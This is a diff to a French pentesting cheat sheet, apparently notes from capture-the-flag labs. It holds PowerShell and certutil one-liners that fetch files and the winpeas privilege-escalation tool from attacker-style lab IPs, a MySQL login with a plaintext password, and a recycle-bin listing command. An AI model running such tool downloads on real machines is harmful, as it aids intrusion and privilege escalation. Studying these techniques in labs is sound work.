@@ -291,12 +291,14 @@ allow-hotplug eth0
   	- En powershell --> `Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 500MB} | Sort-Object length -Descending | Select-Object Name,Directory,@{n='GB';e={"{0:N2}" -F ($_.length/ 1GB)}}`
  
 - Télécharger des fichiers via powershell :
-	- `$url = "http://10.10.16.39:8000/python3.zip" $dest = "C:\temp\python.zip" Invoke-RestMethod -Uri $url -OutFile $dest`
+	- `$url = "http://10.10.16.39:8000/python3.zip";$dest = "C:\temp\python.zip";Invoke-RestMethod -Uri $url -OutFile $dest`
 	-  `certutil -urlcache -split -f http://10.10.16.28/winpeas.exe winpeas.exe`
 
 - Trouver un binaire précis en powershell --> `Get-ChildItem -Path C:\ -Filter mysql.exe -Recurse -ErrorAction SilentlyContinue`
 
 - MySQL powershell --> `.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`
+
+- Lister la corbeille Windows --> `$shell = New-Object -ComObject Shell.Application;$recycleBin = $shell.Namespace(0xA);$recycleBin.items() | Select-Object Name, Path`
 
 ---
 
